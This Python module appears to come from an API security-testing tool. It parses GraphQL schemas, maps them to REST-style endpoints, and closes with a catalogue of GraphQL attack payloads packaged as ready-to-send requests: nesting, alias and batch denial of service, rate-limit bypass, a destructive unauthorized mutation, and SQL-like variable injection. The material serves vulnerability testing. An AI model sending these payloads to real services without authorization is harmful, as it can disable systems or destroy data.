""""GraphQL schema parser — SDL and introspection JSON."""
from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from entropy.core.models import (
    APIEndpoint, APIParameter, APISchema, RequestMethod,
)


# ---------------------------------------------------------------------------
# GraphQL Schema Model
# ---------------------------------------------------------------------------

@dataclass
class GQLField:
    name:      str
    type_name: str
    args:      List[Dict[str, Any]] = field(default_factory=list)
    is_list:   bool = False
    nullable:  bool = True


@dataclass
class GQLType:
    name:   str
    kind:   str   # OBJECT | INPUT_OBJECT | ENUM | SCALAR | INTERFACE | UNION
    fields: List[GQLField] = field(default_factory=list)


@dataclass
class GQLSchema:
    query_type:    Optional[str] = None
    mutation_type: Optional[str] = None
    types:         Dict[str, GQLType] = field(default_factory=dict)
    endpoint:      str = "/graphql"


# ---------------------------------------------------------------------------
# Parser: introspection JSON
# ---------------------------------------------------------------------------

class GraphQLParser:
    """
    Parse a GraphQL schema from:
      - Introspection JSON  (result of a __schema query)
      - SDL string          (basic field/type extraction via regex)
      - A live endpoint     (sends an introspection query)
    """

    _INTROSPECTION_QUERY = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name kind
          fields(includeDeprecated: true) {
            name
            args { name type { name kind ofType { name kind } } }
            type { name kind ofType { name kind ofType { name kind } } }
          }
          inputFields { name type { name kind ofType { name kind } } }
        }
      }
    }
    """

    # ---- Public -----------------------------------------------------------

    @classmethod
    def from_introspection_json(cls, data: Dict[str, Any]) -> GQLSchema:
        raw_schema = data.get("data", {}).get("__schema") or data.get("__schema") or data
        schema = GQLSchema(
            query_type=(raw_schema.get("queryType") or {}).get("name"),
            mutation_type=(raw_schema.get("mutationType") or {}).get("name"),
        )
        for raw_type in raw_schema.get("types", []):
            if raw_type["name"].startswith("__"):
                continue
            kind   = raw_type.get("kind", "OBJECT")
            fields = cls._parse_fields(raw_type.get("fields") or raw_type.get("inputFields") or [])
            schema.types[raw_type["name"]] = GQLType(name=raw_type["name"], kind=kind, fields=fields)
        return schema

    @classmethod
    def from_file(cls, path: str) -> GQLSchema:
        import pathlib
        raw = pathlib.Path(path).read_text(encoding="utf-8")
        try:
            data = json.loads(raw)
            return cls.from_introspection_json(data)
        except json.JSONDecodeError:
            return cls.from_sdl(raw)

    @classmethod
    def from_sdl(cls, sdl: str) -> GQLSchema:
        """Very basic SDL parser — extracts types and fields via regex."""
        schema = GQLSchema()
        # Detect query/mutation roots
        m = re.search(r'schema\s*\{[^}]*query\s*:\s*(\w+)', sdl)
        if m:
            schema.query_type = m.group(1)
        m = re.search(r'schema\s*\{[^}]*mutation\s*:\s*(\w+)', sdl)
        if m:
            schema.mutation_type = m.group(1)
        if not schema.query_type:
            schema.query_type = "Query"
        if not schema.mutation_type:
            schema.mutation_type = "Mutation"

        # Extract type blocks
        for match in re.finditer(r'(type|input)\s+(\w+)\s*\{([^}]+)\}', sdl, re.DOTALL):
            kind      = "OBJECT" if match.group(1) == "type" else "INPUT_OBJECT"
            type_name = match.group(2)
            body      = match.group(3)
            fields    = []
            for field_match in re.finditer(r'(\w+)\s*(?:\([^)]*\))?\s*:\s*\[?(\w+)', body):
                fields.append(GQLField(name=field_match.group(1), type_name=field_match.group(2)))
            schema.types[type_name] = GQLType(name=type_name, kind=kind, fields=fields)
        return schema

    @classmethod
    def from_endpoint(cls, url: str, headers: Optional[Dict[str, str]] = None) -> GQLSchema:
        """Fetch schema by running an introspection query against a live endpoint."""
        import urllib.request
        payload = json.dumps({"query": cls._INTROSPECTION_QUERY}).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type": "application/json", **(headers or {})},
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = json.loads(resp.read())
        return cls.from_introspection_json(data)

    # ---- Private ----------------------------------------------------------

    @staticmethod
    def _parse_fields(raw_fields: List[Dict]) -> List[GQLField]:
        result = []
        for rf in raw_fields or []:
            type_info = rf.get("type", {})
            type_name = GraphQLParser._unwrap_type(type_info)
            is_list   = type_info.get("kind") == "LIST" or (
                type_info.get("ofType", {}) or {}
            ).get("kind") == "LIST"
            result.append(GQLField(
                name=rf["name"],
                type_name=type_name,
                args=rf.get("args", []),
                is_list=is_list,
            ))
        return result

    @staticmethod
    def _unwrap_type(type_obj: Dict, depth: int = 0) -> str:
        if depth > 10:
            return "Unknown"
        if not type_obj:
            return "Unknown"
        if type_obj.get("name"):
            return type_obj["name"]
        return GraphQLParser._unwrap_type(type_obj.get("ofType", {}), depth + 1)


# ---------------------------------------------------------------------------
# GQL → APISchema converter
# ---------------------------------------------------------------------------

def graphql_to_api_schema(gql: GQLSchema, base_url: str = "http://localhost:4000") -> APISchema:
    """
    Convert a GQLSchema into an APISchema so the Entropy pipeline can
    treat it identically to a REST API.
    Each Query field → GET-like endpoint
    Each Mutation field → POST-like endpoint
    """
    endpoints: List[APIEndpoint] = []

    query_type    = gql.types.get(gql.query_type or "Query")
    mutation_type = gql.types.get(gql.mutation_type or "Mutation")

    def _type_to_params(gql_type: Optional[GQLType]) -> List[APIParameter]:
        if not gql_type:
            return []
        return [APIParameter(name=f.name, location="body", type=_map_scalar(f.type_name)) for f in gql_type.fields]

    def _map_scalar(t: str) -> str:
        mapping = {"Int": "integer", "Float": "number", "Boolean": "boolean",
                   "String": "string", "ID": "string"}
        return mapping.get(t, "object")

    if query_type:
        for field in query_type.fields:
            params = [APIParameter(name=arg["name"], location="query", type="string") for arg in field.args]
            endpoints.append(APIEndpoint(
                path=f"/graphql?op={field.name}",
                method=RequestMethod.POST,
                summary=f"GraphQL Query: {field.name}",
                description=f"Returns {field.type_name}",
                parameters=params,
                request_body={"media_type": "application/json", "schema": {"type": "object", "properties": {"query": {"type": "string"}}}},
                tags=["graphql", "query"],
            ))

    if mutation_type:
        for field in mutation_type.fields:
            params = [APIParameter(name=arg["name"], location="body", type="string") for arg in field.args]
            endpoints.append(APIEndpoint(
                path=f"/graphql?op={field.name}",
                method=RequestMethod.POST,
                summary=f"GraphQL Mutation: {field.name}",
                description=f"Mutates {field.type_name}",
                parameters=params,
                request_body={"media_type": "application/json", "schema": {"type": "object", "properties": {"query": {"type": "string"}}}},
                tags=["graphql", "mutation"],
                security=[{"bearerAuth": []}],
            ))

    return APISchema(
        title="GraphQL API",
        version="1.0",
        base_url=base_url,
        endpoints=endpoints,
    )


# ---------------------------------------------------------------------------
# GraphQL-specific attack payloads
# ---------------------------------------------------------------------------

GRAPHQL_ATTACK_QUERIES = {
    "introspection": {
        "query": "{ __schema { types { name fields { name } } } }",
        "description": "Full schema introspection — may expose internal types and admin mutations.",
        "severity": "medium",
    },
    "deep_nesting": {
        "query": "{ a { a { a { a { a { a { a { a { a { a { id } } } } } } } } } } }",
        "description": "Deeply nested query to trigger stack overflow or CPU exhaustion.",
        "severity": "high",
    },
    "batch_queries": {
        "query": "[" + ",".join([f'{{"query":"{{ user(id:{i}){{ id email }} }}"}}' for i in range(100)]) + "]",
        "description": "100-request batch to bypass per-request rate limiting.",
        "severity": "high",
    },
    "alias_bombing": {
        "query": "{ " + " ".join([f"u{i}: users {{ id }}" for i in range(50)]) + " }",
        "description": "50 aliased identical fields — multiplies resolver calls.",
        "severity": "high",
    },
    "fragment_spreading_dos": {
        "query": "fragment F on User { id ...F } { user(id:1) { ...F } }",
        "description": "Circular fragment reference to trigger infinite loop.",
        "severity": "critical",
    },
    "field_suggestion_probe": {
        "query": "{ usersAdmin { id } }",
        "description": "Deliberately misspelled field to trigger 'did you mean userAdmin?' suggestions that reveal schema.",
        "severity": "low",
    },
    "mutation_brute": {
        "query": "mutation { deleteAllUsers { count } }",
        "description": "Attempt to call destructive mutations without authorization.",
        "severity": "critical",
    },
    "variable_injection": {
        "query": 'query GetUser($id: ID!) { user(id: $id) { email role isAdmin } }',
        "variables": {"id": "1 OR 1=1"},
        "description": "Inject SQL-like value into GraphQL variable.",
        "severity": "high",
    },
}


def get_graphql_attack_requests(base_url: str, headers: Optional[Dict[str, str]] = None) -> List[Dict[str, Any]]:
    """Return a list of raw request dicts for GraphQL attack scenarios."""
    url    = base_url.rstrip("/") + "/graphql"
    hdrs   = {"Content-Type": "application/json", **(headers or {})}
    result = []
    for name, attack in GRAPHQL_ATTACK_QUERIES.items():
        payload: Dict[str, Any] = {"query": attack["query"]}
        if "variables" in attack:
            payload["variables"] = attack["variables"]
        result.append({
            "name":        name,
            "description": attack["description"],
            "severity":    attack["severity"],
            "method":      "POST",
            "url":         url,
            "headers":     hdrs,
            "body":        payload,
        })
    return result
